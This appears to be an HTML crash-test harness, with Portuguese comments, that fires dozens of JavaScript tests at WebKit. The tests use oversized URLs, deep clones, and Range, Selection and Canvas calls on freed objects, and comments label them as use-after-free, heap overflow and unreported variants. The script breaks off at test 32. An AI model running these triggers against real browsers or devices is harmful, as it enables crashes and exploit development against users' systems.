<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>WebKit Boundary Crash Test Suite (Aâ€“F)</title>
  <style>
    body { font-family: monospace; }
    button { margin: 6px; }
    #log { white-space: pre-wrap; border: 1px solid #ccc; padding: 8px; height: 300px; overflow:auto; }
  </style>
</head>
<body>

<h1>WebKit Boundary Crash Test Suite</h1>
<p>Execute um teste por vez. Observe crash, freeze, abort ou CE-36329-3.</p>

<button onclick="testA()">Teste A  History replace/push Boundary</button>
<button onclick="testB()">Teste B  DOMParser + innerHTML</button>
<button onclick="testC()">Teste C  Range + Layout</button>
<button onclick="testD()">Teste D  UTF-8 / UTF-16 URL Boundary</button>
<button onclick="testE()">Teste E  Canvas Memory Boundary</button>
<button onclick="testF()">Teste F  postMessage Structured Clone</button>
<button onclick="testG()">Teste G  SharedArrayBuffer / Atomics</button>
<button onclick="testH()">Teste H  iframe srcdoc boundary</button>
<button onclick="testI()">Teste I  CSS parser oversized rule</button>
<button onclick="testJ()">Teste J  MediaSource buffer append</button>
<button onclick="testK()">Teste K  Worker recursion + structured clone</button>
<button onclick="testL()">TEST L  SVG Path Parser</button>
<button onclick="testM()">TEST M  FontFace Loader</button>
<button onclick="testN()">TEST N  OffscreenCanvas Transfer</button>
<button onclick="testO()">TEST O  ResizeObserver Loop</button>
<button onclick="testP()">TEST P  AudioBuffer Copy</button>
<button onclick="testQ()">TEST Q  Intl Boundary</button>
<button onclick="testR()">TEST R  JSON Serializer Depth</button>
<button onclick="testS()">TEST S  History + GC + Clone</button>
<button onclick="testT()">TEST T  SVG + Layout</button>
<button onclick="testU()">TEST U  Canvas / ImageBitmap</button>
<button onclick="testV()">TEST V DOM + Selection</button>
<button onclick="testW()">TEST W  Audio + Worker</button>
<button onclick="testX()">TEST X  Blob / URL Lifetime</button>
<button onclick="testY()">TEST Y  Promise Storm</button>
<button onclick="t1()">TEST 1</button>
<button onclick="t2()">TEST 2</button>
<button onclick="t3()">TEST 3</button>
<button onclick="t4()">TEST 4</button>
<button onclick="t5()">TEST 5</button>
<button onclick="t6()">TEST 6</button>
<button onclick="t7()">TEST 7</button>
<button onclick="t8()">TEST 8</button>
<button onclick="t9()">TEST 9</button>
<button onclick="t10()">TEST 10</button>
<button onclick="t11()">TEST 11</button>
<button onclick="t12()">TEST 12</button>
<button onclick="t13()">TEST 13</button>
<button onclick="t14()">TEST 14</button>
<button onclick="t15()">TEST 15</button>
<button onclick="t16()">TEST 16</button>
<button onclick="t17()">TEST 17</button>
<button onclick="t18()">TEST 18</button>
<button onclick="t19()">TEST 19</button>
<button onclick="t20()">TEST 20</button>
<button onclick="t21()">TEST 21</button>
<button onclick="t22()">TEST 22</button>
<button onclick="t23()">TEST 23</button>
<button onclick="t24()">TEST 24</button>
<button onclick="t25()">TEST 25</button>
<button onclick="t26()">TEST 26</button>
<button onclick="t27()">TEST 27</button>
<button onclick="t28()">TEST 28</button>
<button onclick="t29()">TEST 29</button>
<button onclick="t30()">TEST 30</button>
<button onclick="t31()">TEST 31</button>
<button onclick="t32()">TEST 32</button>
<button onclick="t33()">TEST 33</button>
<button onclick="t34()">TEST 34</button>
<button onclick="t35()">TEST 35</button>
<button onclick="t36()">TEST 36</button>
<button onclick="t37()">TEST 37</button>
<button onclick="t38()">TEST 38</button>
<button onclick="t39()">TEST 39</button>
<button onclick="t40()">TEST 40</button>
<button onclick="t41()">TEST 41</button>
<button onclick="t42()">TEST 42</button>
<button onclick="t43()">TEST 43</button>
<button onclick="t44()">TEST 44</button>
<button onclick="t45()">TEST 45</button>
<button onclick="t46()">TEST 46</button>
<button onclick="t47()">TEST 47</button>
<button onclick="t48()">TEST 48</button>
<button onclick="t49()">TEST 49</button>
<button onclick="t50()">TEST 50</button>
<button onclick="t51()">TEST 51</button>
<button onclick="t52()">TEST 52</button>
<button onclick="t53()">TEST 53</button>
<button onclick="t54()">TEST 54</button>
<button onclick="t55()">TEST 55</button>

<hr>
<div id="log"></div>

<script>
function log(msg){
  const l = document.getElementById("log");
  l.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
  l.scrollTop = l.scrollHeight;
}

/* =========================================================
 * TESTE A â€” History (variante NÃƒO reportada)
 * Sinal esperado: CE-36329-3 / abort interno
 * =======================================================*/
function testA(){
  log("TESTE A iniciado");
  const BASE = 700000;
  const delta = 1; // ajuste fino aqui

  const baseStr = "A".repeat(BASE);
  const payload1 = "/" + baseStr;
  const payload2 = "/" + baseStr + "B".repeat(delta);

  try {
    history.pushState({a:1}, "A1", payload1);
    history.replaceState({b:2}, "A2", payload2);
    history.pushState({c:3}, "A3", payload2);
    log("TESTE A executado (observe comportamento)");
  } catch(e){
    log("EXCEÃ‡ÃƒO JS: " + e);
  }
}

/* =========================================================
 * TESTE B â€” DOMParser + innerHTML
 * Sinal esperado: abort / freeze
 * =======================================================*/
function testB(){
  log("TESTE B iniciado");
  const size = 250000; // ajuste +1
  const html = "<div>" + "A".repeat(size) + "</div>";

  try {
    const doc = new DOMParser().parseFromString(html, "text/html");
    document.body.innerHTML = doc.body.innerHTML;
    log("TESTE B executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO JS: " + e);
  }
}

/* =========================================================
 * TESTE C â€” Range + Layout
 * Sinal esperado: freeze / assert layout
 * =======================================================*/
function testC(){
  log("TESTE C iniciado");
  const container = document.createElement("div");
  for(let i=0;i<5000;i++){
    const s = document.createElement("span");
    s.textContent = "X";
    container.appendChild(s);
  }
  document.body.appendChild(container);

  try {
    const r = document.createRange();
    r.selectNodeContents(container.childNodes[2500]);
    document.body.removeChild(container); // estado invÃ¡lido
    document.body.offsetHeight; // forÃ§a layout
    window.getSelection().addRange(r);
    log("TESTE C executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO JS: " + e);
  }
}

/* =========================================================
 * TESTE D â€” UTF-8 / UTF-16 Boundary
 * Sinal esperado: crash dependente de boundary
 * =======================================================*/
function testD(){
  log("TESTE D iniciado");
  const base = "A".repeat(200000);
  const utf8 = "ðŸ’¥"; // multibyte
  const url = "/" + base + utf8; // variar +1 utf8

  try {
    location.href = url;
    log("TESTE D executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO JS: " + e);
  }
}

/* =========================================================
 * TESTE E â€” Canvas Memory Boundary
 * Sinal esperado: freeze / memory breach
 * =======================================================*/
function testE(){
  log("TESTE E iniciado");
  const c = document.createElement("canvas");
  const size = 8192; // teste 8191 / 8192 / 8193
  c.width = size;
  c.height = size;
  document.body.appendChild(c);

  try {
    const ctx = c.getContext("2d");
    const img = ctx.createImageData(size, size);
    ctx.putImageData(img, 0, 0);
    log("TESTE E executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO JS: " + e);
  }
}

/* =========================================================
 * TESTE F â€” postMessage Structured Clone
 * Sinal esperado: abort / crash serializer
 * =======================================================*/
function testF(){
  log("TESTE F iniciado");
  const deep = {};
  let cur = deep;
  for(let i=0;i<20000;i++){
    cur.next = {};
    cur = cur.next;
  }

  try {
    window.postMessage(deep, "*");
    log("TESTE F executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO JS: " + e);
  }
}
/* =====================================================
 * TESTE G â€” SharedArrayBuffer / Atomics
 * Vetor: IPC + memÃ³ria compartilhada
 * Sinal: abort / CE-36329-3
 * ===================================================*/
function testG(){
  log("TESTE G iniciado");
  try {
    const sab = new SharedArrayBuffer(4096); // testar 4095 / 4096 / 4097
    const ia = new Int32Array(sab);
    for(let i=0;i<1000000;i++){
      Atomics.add(ia, 0, 1);
    }
    log("TESTE G executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO: " + e);
  }
}

/* =====================================================
 * TESTE H â€” iframe srcdoc boundary
 * Vetor: parser HTML + isolamento
 * ===================================================*/
function testH(){
  log("TESTE H iniciado");
  const size = 180000; // variar Â±1
  const payload = "<div>" + "A".repeat(size) + "</div>";

  try {
    const f = document.createElement("iframe");
    f.srcdoc = payload;
    document.body.appendChild(f);
    log("TESTE H executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO: " + e);
  }
}

/* =====================================================
 * TESTE I â€” CSS parser oversized rule
 * Vetor: parser CSS / heap
 * ===================================================*/
function testI(){
  log("TESTE I iniciado");
  const len = 120000; // variar Â±1
  const css = ".x{color:red;" + "a:".repeat(len) + "b:c;}";

  try {
    const s = document.createElement("style");
    s.textContent = css;
    document.head.appendChild(s);
    log("TESTE I executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO: " + e);
  }
}

/* =====================================================
 * TESTE J â€” MediaSource appendBuffer
 * Vetor: pipeline mÃ­dia / quota
 * ===================================================*/
function testJ(){
  log("TESTE J iniciado");
  if(!window.MediaSource){
    log("MediaSource indisponÃ­vel");
    return;
  }

  try {
    const ms = new MediaSource();
    const v = document.createElement("video");
    v.src = URL.createObjectURL(ms);
    document.body.appendChild(v);

    ms.addEventListener("sourceopen", () => {
      const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
      const buf = new Uint8Array(1024 * 1024 * 8); // 8MB â†’ variar
      sb.appendBuffer(buf);
      log("appendBuffer executado");
    });
  } catch(e){
    log("EXCEÃ‡ÃƒO: " + e);
  }
}

/* =====================================================
 * TESTE K â€” Worker recursion + structured clone
 * Vetor: serializer + stack
 * ===================================================*/
function testK(){
  log("TESTE K iniciado");
  const code = `
    function build(n){
      if(n===0) return {};
      return {a:build(n-1)};
    }
    const obj = build(12000); // variar Â±1
    postMessage(obj);
  `;
  try {
    const w = new Worker(URL.createObjectURL(
      new Blob([code], {type:"text/javascript"})
    ));
    w.onmessage = () => {};
    log("TESTE K executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO: " + e);
  }
}
/* =====================================================
 * TEST L â€” SVG Path Parser
 * ===================================================*/
function testL(){
  log("TEST L iniciado");
  const n = 90000; // variar Â±1
  const path = "M0 0 " + "L1 1 ".repeat(n);

  try {
    const svg = document.createElementNS("http://www.w3.org/2000/svg","svg");
    const p = document.createElementNS(svg.namespaceURI,"path");
    p.setAttribute("d", path);
    svg.appendChild(p);
    document.body.appendChild(svg);
    log("TEST L executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO: " + e);
  }
}

/* =====================================================
 * TEST M â€” FontFace / CSS Loader
 * ===================================================*/
function testM(){
  log("TEST M iniciado");
  const len = 160000; // variar Â±1
  const css = "@font-face{font-family:x;src:url(data:font/woff;base64," +
              "A".repeat(len) + ")}";

  try {
    const s = document.createElement("style");
    s.textContent = css;
    document.head.appendChild(s);
    document.body.style.fontFamily = "x";
    log("TEST M executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO: " + e);
  }
}

/* =====================================================
 * TEST N â€” OffscreenCanvas Transfer
 * ===================================================*/
function testN(){
  log("TEST N iniciado");
  try {
    const off = new OffscreenCanvas(4096,4096);
    const ctx = off.getContext("2d");
    ctx.fillRect(0,0,4096,4096);

    const worker = new Worker(URL.createObjectURL(new Blob([`
      onmessage = e => {
        const c = e.data;
        const x = c.getContext("2d");
        x.fillRect(0,0,4096,4096);
      };
    `], {type:"text/javascript"})));

    worker.postMessage(off, [off]);
    log("TEST N executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO: " + e);
  }
}

/* =====================================================
 * TEST O â€” ResizeObserver recursion
 * ===================================================*/
function testO(){
  log("TEST O iniciado");
  try {
    const d = document.createElement("div");
    d.style.width = "100px";
    d.style.height = "100px";
    document.body.appendChild(d);

    const ro = new ResizeObserver(() => {
      d.style.width = (parseInt(d.style.width)+1) + "px";
    });
    ro.observe(d);
    log("TEST O executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO: " + e);
  }
}

/* =====================================================
 * TEST P â€” AudioBuffer Heap
 * ===================================================*/
function testP(){
  log("TEST P iniciado");
  try {
    const ctx = new AudioContext();
    const buf = ctx.createBuffer(2, 4800000, 48000); // variar frames
    const data = new Float32Array(buf.length);
    buf.copyToChannel(data, 0);
    log("TEST P executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO: " + e);
  }
}

/* =====================================================
 * TEST Q â€” Intl / ICU Boundary
 * ===================================================*/
function testQ(){
  log("TEST Q iniciado");
  try {
    const big = "A".repeat(250000); // variar Â±1
    new Intl.Collator("en").compare(big, big + "B");
    log("TEST Q executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO: " + e);
  }
}

/* =====================================================
 * TEST R â€” JSON Serializer Depth
 * ===================================================*/
function testR(){
  log("TEST R iniciado");
  function deep(n){
    if(n===0) return {};
    return {a: deep(n-1)};
  }
  try {
    const obj = deep(14000); // variar Â±1
    JSON.stringify(obj);
    log("TEST R executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO: " + e);
  }
}
/* =====================================================
 * TEST S â€” History + GC + StructuredClone
 * ===================================================*/
function testS(){
  log("TEST S iniciado");
  try {
    let arr = [];
    for(let i=0;i<8000;i++){ // BOUNDARY
      history.pushState({i, big:"A".repeat(2000)}, "");
    }

    const worker = new Worker(URL.createObjectURL(new Blob([`
      onmessage = e => {
        postMessage(structuredClone(e.data));
      };
    `],{type:"text/javascript"})));

    worker.postMessage(arr);
    arr = null;

    for(let i=0;i<5000;i++){
      new ArrayBuffer(1024*1024);
    }
    log("TEST S executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO: "+e);
  }
}

/* =====================================================
 * TEST T â€” SVG + CSS Layout Stress
 * ===================================================*/
function testT(){
  log("TEST T iniciado");
  try {
    const svg = document.createElementNS("http://www.w3.org/2000/svg","svg");
    svg.setAttribute("width","100%");
    svg.setAttribute("height","100%");

    for(let i=0;i<1200;i++){ // BOUNDARY
      const r = document.createElementNS(svg.namespaceURI,"rect");
      r.setAttribute("x",i);
      r.setAttribute("y",i);
      r.setAttribute("width","100%");
      r.setAttribute("height","100%");
      svg.appendChild(r);
    }

    document.body.appendChild(svg);
    document.body.style.transform = "scale(1.01)";
    log("TEST T executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO: "+e);
  }
}

/* =====================================================
 * TEST U â€” Canvas + ImageBitmap + Transfer
 * ===================================================*/
function testU(){
  log("TEST U iniciado");
  try {
    const canvas = document.createElement("canvas");
    canvas.width = canvas.height = 4096;
    const ctx = canvas.getContext("2d");
    ctx.fillRect(0,0,4096,4096);

    createImageBitmap(canvas).then(bmp=>{
      const w = new Worker(URL.createObjectURL(new Blob([`
        onmessage=e=>{
          const c=new OffscreenCanvas(4096,4096);
          c.getContext("2d").drawImage(e.data,0,0);
        };
      `],{type:"text/javascript"})));
      w.postMessage(bmp,[bmp]);
    });
    log("TEST U executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO: "+e);
  }
}

/* =====================================================
 * TEST V â€” DOM Removal + Selection + Range
 * ===================================================*/
function testV(){
  log("TEST V iniciado");
  try {
    const d = document.createElement("div");
    d.textContent = "X".repeat(20000); // BOUNDARY
    document.body.appendChild(d);

    const r = document.createRange();
    r.selectNodeContents(d);

    document.body.removeChild(d);

    const sel = window.getSelection();
    sel.removeAllRanges();
    sel.addRange(r); // histÃ³rico de crashes WebKit

    log("TEST V executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO: "+e);
  }
}

/* =====================================================
 * TEST W â€” WebAudio + GC + Worker
 * ===================================================*/
function testW(){
  log("TEST W iniciado");
  try {
    const ctx = new AudioContext();
    const buf = ctx.createBuffer(1, 4800000, 48000); // BOUNDARY
    const src = ctx.createBufferSource();
    src.buffer = buf;
    src.connect(ctx.destination);
    src.start();

    const w = new Worker(URL.createObjectURL(new Blob([`
      onmessage=()=>{ for(let i=0;i<2000;i++) new ArrayBuffer(1024*512); };
    `],{type:"text/javascript"})));
    w.postMessage(1);
    log("TEST W executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO: "+e);
  }
}

/* =====================================================
 * TEST X â€” Blob / URL Lifetime
 * ===================================================*/
function testX(){
  log("TEST X iniciado");
  try {
    let urls=[];
    for(let i=0;i<3000;i++){ // BOUNDARY
      const b=new Blob(["A".repeat(10000)]);
      const u=URL.createObjectURL(b);
      urls.push(u);
      URL.revokeObjectURL(u);
    }
    log("TEST X executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO: "+e);
  }
}

/* =====================================================
 * TEST Y â€” Promise Microtask Storm
 * ===================================================*/
function testY(){
  log("TEST Y iniciado");
  try {
    let p=Promise.resolve();
    for(let i=0;i<100000;i++){ // BOUNDARY
      p=p.then(()=>{});
    }
    log("TEST Y executado");
  } catch(e){
    log("EXCEÃ‡ÃƒO: "+e);
  }
}
/* =========================================================
 * TEST 1 â€” History State Heap Boundary
 * Classe: Heap overflow / refcount
 * =======================================================*/
function t1(){
  log("TEST 1 iniciado");
  try{
    const BASE=709522; // ajuste fino aqui
    const payload="/"+ "A".repeat(BASE) + "\x00".repeat(40);
    history.pushState({x:payload}, "", payload);
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 2 â€” DOM Node + Range After Removal
 * Classe: DOM UAF
 * =======================================================*/
function t2(){
  log("TEST 2 iniciado");
  try{
    const d=document.createElement("div");
    d.textContent="X".repeat(30000); // BOUNDARY
    document.body.appendChild(d);
    const r=document.createRange();
    r.selectNodeContents(d);
    document.body.removeChild(d);
    getSelection().removeAllRanges();
    getSelection().addRange(r);
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 3 â€” Canvas Backing Store Reallocation
 * Classe: Backing store reuse
 * =======================================================*/
function t3(){
  log("TEST 3 iniciado");
  try{
    const c=document.createElement("canvas");
    c.width=c.height=8192; // BOUNDARY
    const ctx=c.getContext("2d");
    ctx.fillRect(0,0,8192,8192);
    c.width=1; c.height=1;
    ctx.getImageData(0,0,8192,8192);
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 4 â€” TypedArray Detach + Access
 * Classe: UAF / neutering failure
 * =======================================================*/
function t4(){
  log("TEST 4 iniciado");
  try{
    const buf=new ArrayBuffer(16384);
    const u32=new Uint32Array(buf);
    const w=new Worker(URL.createObjectURL(new Blob([`
      onmessage=e=>postMessage("ok");
    `],{type:"text/javascript"})));
    w.postMessage(buf,[buf]);
    u32[0]=0x41414141;
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 5 â€” SVG Layout Explosion
 * Classe: Layout engine corruption
 * =======================================================*/
function t5(){
  log("TEST 5 iniciado");
  try{
    const svg=document.createElementNS("http://www.w3.org/2000/svg","svg");
    for(let i=0;i<1500;i++){ // BOUNDARY
      const r=document.createElementNS(svg.namespaceURI,"rect");
      r.setAttribute("width","100%");
      r.setAttribute("height","100%");
      svg.appendChild(r);
    }
    document.body.appendChild(svg);
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 6 â€” WebAudio Huge Buffer
 * Classe: Media heap corruption
 * =======================================================*/
function t6(){
  log("TEST 6 iniciado");
  try{
    const ctx=new AudioContext();
    const buf=ctx.createBuffer(2,4800000,48000); // BOUNDARY
    const src=ctx.createBufferSource();
    src.buffer=buf;
    src.connect(ctx.destination);
    src.start();
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 7 â€” Blob URL Lifetime Abuse
 * Classe: Refcount / double free
 * =======================================================*/
function t7(){
  log("TEST 7 iniciado");
  try{
    for(let i=0;i<4000;i++){ // BOUNDARY
      const b=new Blob(["A".repeat(8000)]);
      const u=URL.createObjectURL(b);
      URL.revokeObjectURL(u);
    }
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 8 â€” Promise Microtask Flood
 * Classe: Scheduler corruption
 * =======================================================*/
function t8(){
  log("TEST 8 iniciado");
  try{
    let p=Promise.resolve();
    for(let i=0;i<120000;i++){ // BOUNDARY
      p=p.then(()=>{});
    }
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 9 â€” Selection + Layout + GC
 * Classe: DOM / layout UAF
 * =======================================================*/
function t9(){
  log("TEST 9 iniciado");
  try{
    const d=document.createElement("div");
    d.textContent="Z".repeat(20000);
    document.body.appendChild(d);
    const r=document.createRange();
    r.selectNode(d);
    document.body.removeChild(d);
    for(let i=0;i<3000;i++) new ArrayBuffer(1024*512);
    getSelection().addRange(r);
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 10 â€” Worker Heap Pressure + Main Thread Access
 * Classe: Cross-heap lifetime bug
 * =======================================================*/
function t10(){
  log("TEST 10 iniciado");
  try{
    const w=new Worker(URL.createObjectURL(new Blob([`
      for(let i=0;i<2000;i++) new ArrayBuffer(1024*1024);
    `],{type:"text/javascript"})));
    for(let i=0;i<2000;i++) new ArrayBuffer(1024*1024);
  }catch(e){ log(e); }
}
/* =========================================================
 * TEST 11 â€” DOM TreeWalker After Free
 * Classe: DOM UAF / iterator lifetime
 * =======================================================*/
function t11(){
  log("TEST 11 iniciado");
  try{
    const root=document.createElement("div");
    for(let i=0;i<2000;i++){ // BOUNDARY
      const c=document.createElement("span");
      c.textContent="X".repeat(100);
      root.appendChild(c);
    }
    document.body.appendChild(root);
    const walker=document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT);
    document.body.removeChild(root);
    while(walker.nextNode()){}
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 12 â€” ResizeObserver + Node Removal
 * Classe: Layout / observer UAF
 * =======================================================*/
function t12(){
  log("TEST 12 iniciado");
  try{
    const d=document.createElement("div");
    d.style.width="100px";
    d.style.height="100px";
    document.body.appendChild(d);
    const ro=new ResizeObserver(()=>{ d.offsetWidth; });
    ro.observe(d);
    document.body.removeChild(d);
    d.style.width="200px";
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 13 â€” OffscreenCanvas Transfer Abuse
 * Classe: Backing store / cross-thread lifetime
 * =======================================================*/
function t13(){
  log("TEST 13 iniciado");
  try{
    const off=new OffscreenCanvas(4096,4096); // BOUNDARY
    const ctx=off.getContext("2d");
    ctx.fillRect(0,0,4096,4096);
    const w=new Worker(URL.createObjectURL(new Blob([`
      onmessage=e=>{
        const c=e.data;
        const x=c.getContext("2d");
        x.getImageData(0,0,4096,4096);
      };
    `],{type:"text/javascript"})));
    w.postMessage(off,[off]);
    ctx.getImageData(0,0,4096,4096);
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 14 â€” NodeIterator After GC Pressure
 * Classe: DOM UAF + GC
 * =======================================================*/
function t14(){
  log("TEST 14 iniciado");
  try{
    const d=document.createElement("div");
    d.innerHTML="<span>A</span>".repeat(2000);
    document.body.appendChild(d);
    const it=document.createNodeIterator(d, NodeFilter.SHOW_TEXT);
    document.body.removeChild(d);
    for(let i=0;i<4000;i++) new ArrayBuffer(1024*256);
    while(it.nextNode()){}
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 15 â€” CSSStyleSheet Replace Abuse
 * Classe: Style engine corruption
 * =======================================================*/
function t15(){
  log("TEST 15 iniciado");
  try{
    const sheet=new CSSStyleSheet();
    document.adoptedStyleSheets=[sheet];
    sheet.replaceSync("div{color:red;}");
    document.adoptedStyleSheets=[];
    sheet.replaceSync("span{color:blue;}".repeat(5000)); // BOUNDARY
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 16 â€” MutationObserver + Reinsert Loop
 * Classe: Refcount / observer lifetime
 * =======================================================*/
function t16(){
  log("TEST 16 iniciado");
  try{
    const d=document.createElement("div");
    document.body.appendChild(d);
    const mo=new MutationObserver(()=>{
      document.body.removeChild(d);
      document.body.appendChild(d);
    });
    mo.observe(document.body,{childList:true});
    document.body.removeChild(d);
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 17 â€” AudioNode Disconnect Reuse
 * Classe: Media graph corruption
 * =======================================================*/
function t17(){
  log("TEST 17 iniciado");
  try{
    const ctx=new AudioContext();
    const osc=ctx.createOscillator();
    osc.connect(ctx.destination);
    osc.start();
    osc.disconnect();
    osc.disconnect();
    osc.connect(ctx.destination);
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 18 â€” History Flood + GC
 * Classe: State object lifetime
 * =======================================================*/
function t18(){
  log("TEST 18 iniciado");
  try{
    for(let i=0;i<3000;i++){ // BOUNDARY
      history.pushState({x:"A".repeat(10000)}, "", "#"+i);
    }
    for(let i=0;i<4000;i++) new ArrayBuffer(1024*512);
    history.back();
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 19 â€” DocumentFragment Reparent Abuse
 * Classe: DOM lifetime corruption
 * =======================================================*/
function t19(){
  log("TEST 19 iniciado");
  try{
    const frag=document.createDocumentFragment();
    for(let i=0;i<2000;i++){
      const t=document.createTextNode("Z".repeat(50));
      frag.appendChild(t);
    }
    document.body.appendChild(frag);
    document.body.removeChild(document.body.firstChild);
    document.body.appendChild(frag);
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 20 â€” Mixed API Lifetime Stress
 * Classe: Cross-subsystem corruption
 * =======================================================*/
function t20(){
  log("TEST 20 iniciado");
  try{
    const d=document.createElement("div");
    d.textContent="X".repeat(25000);
    document.body.appendChild(d);
    const r=document.createRange();
    r.selectNodeContents(d);
    document.body.removeChild(d);

    const c=document.createElement("canvas");
    c.width=c.height=4096;
    c.getContext("2d").getImageData(0,0,4096,4096);

    getSelection().addRange(r);
  }catch(e){ log(e); }
}
/* =========================================================
 * TEST 21 â€” DOM Range After Deep GC
 * Classe: DOM UAF / range lifetime
 * =======================================================*/
function t21(){
  log("TEST 21 iniciado");
  try{
    const d=document.createElement("div");
    d.innerHTML="<span>X</span>".repeat(5000); // BOUNDARY
    document.body.appendChild(d);

    const r=document.createRange();
    r.selectNodeContents(d);

    document.body.removeChild(d);

    for(let i=0;i<6000;i++){
      new ArrayBuffer(1024*256);
    }

    r.cloneContents();
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 22 â€” Canvas Backing Store Reallocation
 * Classe: Graphics memory corruption
 * =======================================================*/
function t22(){
  log("TEST 22 iniciado");
  try{
    const c=document.createElement("canvas");
    c.width=c.height=8192; // BOUNDARY
    const ctx=c.getContext("2d");
    ctx.fillRect(0,0,8192,8192);

    c.width=1;
    c.height=1;

    ctx.getImageData(0,0,1,1);
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 23 â€” Shadow DOM Host Destruction
 * Classe: DOM / shadow lifetime corruption
 * =======================================================*/
function t23(){
  log("TEST 23 iniciado");
  try{
    const host=document.createElement("div");
    const shadow=host.attachShadow({mode:"open"});
    shadow.innerHTML="<span>"+"A".repeat(20000)+"</span>";
    document.body.appendChild(host);

    document.body.removeChild(host);

    shadow.innerHTML+="B";
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 24 â€” NodeIterator + Reparent
 * Classe: iterator lifetime corruption
 * =======================================================*/
function t24(){
  log("TEST 24 iniciado");
  try{
    const d=document.createElement("div");
    d.innerHTML="<b>X</b>".repeat(3000);
    document.body.appendChild(d);

    const it=document.createNodeIterator(d, NodeFilter.SHOW_ELEMENT);

    document.body.removeChild(d);
    document.body.appendChild(d);

    while(it.nextNode()){}
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 25 â€” AudioContext Rapid Create/Destroy
 * Classe: media graph memory corruption
 * =======================================================*/
function t25(){
  log("TEST 25 iniciado");
  try{
    for(let i=0;i<200;i++){ // BOUNDARY
      const ctx=new AudioContext();
      const osc=ctx.createOscillator();
      osc.connect(ctx.destination);
      osc.start();
      osc.stop();
      ctx.close();
    }
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 26 â€” CSSOM Rule Explosion
 * Classe: style engine overflow
 * =======================================================*/
function t26(){
  log("TEST 26 iniciado");
  try{
    const style=document.createElement("style");
    let css="";
    for(let i=0;i<10000;i++){ // BOUNDARY
      css+=`.c${i}{margin:${i}px;}`;
    }
    style.textContent=css;
    document.head.appendChild(style);
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 27 â€” History + Structured Clone Stress
 * Classe: state cloning corruption
 * =======================================================*/
function t27(){
  log("TEST 27 iniciado");
  try{
    const big={};
    for(let i=0;i<2000;i++){
      big["k"+i]="X".repeat(2000);
    }
    history.pushState(big,"","#X");
    history.replaceState(big,"","#Y");
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 28 â€” Selection After Node Destruction
 * Classe: layout / selection UAF
 * =======================================================*/
function t28(){
  log("TEST 28 iniciado");
  try{
    const d=document.createElement("div");
    d.textContent="X".repeat(30000);
    document.body.appendChild(d);

    const sel=getSelection();
    const r=document.createRange();
    r.selectNodeContents(d);
    sel.addRange(r);

    document.body.removeChild(d);
    sel.modify("extend","forward","word");
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 29 â€” DocumentFragment Reuse Stress
 * Classe: DOM refcount corruption
 * =======================================================*/
function t29(){
  log("TEST 29 iniciado");
  try{
    const frag=document.createDocumentFragment();
    for(let i=0;i<5000;i++){
      frag.appendChild(document.createElement("span"));
    }

    document.body.appendChild(frag);
    document.body.textContent="";
    document.body.appendChild(frag);
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 30 â€” Cross-Subsystem Lifetime Collision
 * Classe: DOM + Canvas + History
 * =======================================================*/
function t30(){
  log("TEST 30 iniciado");
  try{
    const d=document.createElement("div");
    d.textContent="X".repeat(20000);
    document.body.appendChild(d);

    const c=document.createElement("canvas");
    c.width=c.height=4096;
    c.getContext("2d").getImageData(0,0,4096,4096);

    history.pushState({d},"","#Z");

    document.body.removeChild(d);
    c.width=1;
  }catch(e){ log(e); }
}
/* =========================================================
 * TEST 31 â€” Range Detach + reuse
 * Classe: DOM Range lifetime corruption
 * =======================================================*/
function t31(){
  log("TEST 31 iniciado");
  try{
    const d=document.createElement("div");
    d.innerHTML="<i>X</i>".repeat(2000);
    document.body.appendChild(d);

    const r=document.createRange();
    r.selectNode(d);

    document.body.removeChild(d);
    r.setStartAfter(d);
  }catch(e){ log(e); }
}

/* =========================================================
 * TEST 32 â€” ResizeObserver after target removal
 * Classe: layout observer lifetime
 * =======================================================*/
function t32(){
  log("TEST 32 iniciado");
  try{
    const d=document.createElement("div");
